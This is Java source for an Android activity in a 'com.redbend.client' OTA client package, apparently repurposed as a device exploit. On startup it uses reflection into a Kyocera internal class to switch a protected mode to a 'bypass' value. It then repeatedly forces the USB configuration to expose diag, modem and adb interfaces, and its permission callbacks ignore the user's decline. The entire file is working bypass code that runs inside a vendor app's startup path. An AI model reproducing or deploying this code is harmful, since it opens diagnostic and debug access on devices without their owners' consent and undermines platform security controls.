package com.redbend.client;

import android.content.Context;
import android.util.Log;

import java.lang.reflect.Method;

public class AdminRequestActivity extends SwmStartupActivityBase {

    private static final String TAG = "AdminRequestActivity";

    private static final String KEY_RW_QFUNC_MODE = "rw_qfunc_mode";
    private static final String VALUE_BYPASS = "1";

    private static final String COMBO_REQUEST = "rndis,diag,modem,none,adb";

    private static final int TRIGGER_COUNT = 3;
    private static final long SLEEP_BETWEEN_MS = 500;

    private static final String PERSIST_USB_CONFIG = "persist.sys.usb.config";
    private static final String FN_DIAG = "diag";

    private static final String TRANSFER_CLASS_NAME = "jp.kyocera.internal.clomask.Transfer";

    private static final String[] SETTER_METHOD_CANDIDATES = {
            "set", "put", "write", "setValue", "update"
    };

    @Override
    protected void sendStartServiceEvent() {
        Log.d(TAG, "sendStartServiceEvent -> USB switch dispatch");

        final Context appContext = getApplicationContext();
        if (appContext == null) {
            Log.e(TAG, "application context is null, cannot run USB switch");
            return;
        }

        Thread t = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    runUsbSwitchSafely(appContext);
                } catch (Throwable th) {
                    Log.e(TAG, "runUsbSwitchSafely fatal: " + th);
                }
            }
        }, "rb-usb-switch");
        t.setDaemon(true);
        t.start();
    }

    @Override
    protected void userAcceptedPermission() {
        Log.d(TAG, "userAcceptedPermission (nop)");
    }

    @Override
    protected void userDeclinedPermission() {
        Log.d(TAG, "userDeclinedPermission (nop)");
    }

    private static void runUsbSwitchSafely(Context ctx) {
        Log.d(TAG, "USB switch start");

        if (ctx == null) {
            Log.e(TAG, "context null, abort");
            return;
        }

        String originalMode = null;
        try {
            originalMode = transferGet(KEY_RW_QFUNC_MODE);
            Log.d(TAG, "step1 original rw_qfunc_mode = " + originalMode);
        } catch (Throwable th) {
            Log.e(TAG, "step1 read original failed: " + th);
        }

        boolean setOk = false;
        try {
            setOk = transferSet(KEY_RW_QFUNC_MODE, VALUE_BYPASS);
            Log.d(TAG, "step2 set rw_qfunc_mode=" + VALUE_BYPASS + " ok=" + setOk);
        } catch (Throwable th) {
            Log.e(TAG, "step2 set failed: " + th);
        }

        try {
            String after = transferGet(KEY_RW_QFUNC_MODE);
            Log.d(TAG, "step3 verify rw_qfunc_mode = " + after);
            if (!VALUE_BYPASS.equals(after)) {
                Log.e(TAG, "step3 verify mismatch, continue anyway");
            }
        } catch (Throwable th) {
            Log.e(TAG, "step3 verify failed: " + th);
        }

        for (int i = 0; i < TRIGGER_COUNT; i++) {
            Log.d(TAG, "step4 trigger #" + (i + 1) + " start");

            try {
                setCurrentFunctionViaUsbManager(ctx, COMBO_REQUEST, false);
            } catch (Throwable th) {
                Log.e(TAG, "step4 setCurrentFunction(false) failed: " + th);
            }
            sleepQuiet(SLEEP_BETWEEN_MS);

            try {
                setCurrentFunctionViaUsbManager(ctx, COMBO_REQUEST, true);
            } catch (Throwable th) {
                Log.e(TAG, "step4 setCurrentFunction(true) failed: " + th);
            }
            sleepQuiet(SLEEP_BETWEEN_MS);

            String persist = "";
            try {
                persist = getSystemProperty(PERSIST_USB_CONFIG, "");
                Log.d(TAG, "step4 persist.sys.usb.config = " + persist);
            } catch (Throwable th) {
                Log.e(TAG, "step4 read persist failed: " + th);
            }

            boolean hasDiag = false;
            try {
                hasDiag = containsFunction(persist, FN_DIAG);
            } catch (Throwable th) {
                Log.e(TAG, "step4 containsFunction failed: " + th);
            }
            if (hasDiag) {
                Log.d(TAG, "step4 diag detected, break");
                break;
            }
        }

        if (originalMode != null) {
            try {
                boolean restored = transferSet(KEY_RW_QFUNC_MODE, originalMode);
                Log.d(TAG, "step5 restored rw_qfunc_mode=" + originalMode + " ok=" + restored);
            } catch (Throwable th) {
                Log.e(TAG, "step5 restore failed: " + th);
            }
        } else {
            Log.d(TAG, "step5 skipped (original was null)");
        }

        Log.d(TAG, "USB switch end");
    }

    private static String transferGet(String key) {
        try {
            Class<?> clazz = Class.forName(TRANSFER_CLASS_NAME);
            Method m = clazz.getMethod("get", String.class);
            m.setAccessible(true);
            Object result = m.invoke(null, key);
            return (result instanceof String) ? (String) result : null;
        } catch (Throwable th) {
            Log.e(TAG, "transferGet(" + key + ") failed: " + th);
            return null;
        }
    }

    private static boolean transferSet(String key, String value) {
        for (String methodName : SETTER_METHOD_CANDIDATES) {
            try {
                Class<?> clazz = Class.forName(TRANSFER_CLASS_NAME);
                Method m = clazz.getMethod(methodName, String.class, String.class);
                m.setAccessible(true);
                m.invoke(null, key, value);
                Log.d(TAG, "transferSet via " + methodName + " ok");
                return true;
            } catch (NoSuchMethodException nsme) {
                Log.d(TAG, "transferSet candidate missing: " + methodName);
            } catch (Throwable th) {
                Log.e(TAG, "transferSet via " + methodName + " failed: " + th);
                return false;
            }
        }
        Log.e(TAG, "transferSet: no candidate method succeeded");
        return false;
    }

    private static void setCurrentFunctionViaUsbManager(Context context,
                                                        String function,
                                                        boolean makeDefault) {
        try {
            if (context == null) {
                return;
            }
            Object service = context.getSystemService("usb");
            if (service == null) {
                Log.e(TAG, "UsbManager is null");
                return;
            }
            Method m = service.getClass().getMethod(
                    "setCurrentFunction", String.class, boolean.class);
            m.setAccessible(true);
            m.invoke(service, function, makeDefault);
        } catch (Throwable th) {
            Log.e(TAG, "setCurrentFunction(" + function + ", " + makeDefault + ") failed: " + th);
        }
    }

    private static String getSystemProperty(String key, String defaultValue) {
        try {
            Class<?> spClass = Class.forName("android.os.SystemProperties");
            Method m = spClass.getMethod("get", String.class, String.class);
            m.setAccessible(true);
            Object result = m.invoke(null, key, defaultValue);
            return (result instanceof String) ? (String) result : defaultValue;
        } catch (Throwable th) {
            return defaultValue;
        }
    }

    private static boolean containsFunction(String functions, String function) {
        if (functions == null || function == null) {
            return false;
        }
        int index = functions.indexOf(function);
        if (index < 0) {
            return false;
        }
        if (index > 0 && functions.charAt(index - 1) != ',') {
            return false;
        }
        int charAfter = index + function.length();
        return charAfter >= functions.length() || functions.charAt(charAfter) == ',';
    }

    private static void sleepQuiet(long ms) {
        try {
            Thread.sleep(ms);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        } catch (Throwable th) {
            Log.d(TAG, "sleepQuiet suppressed: " + th);
        }
    }
}
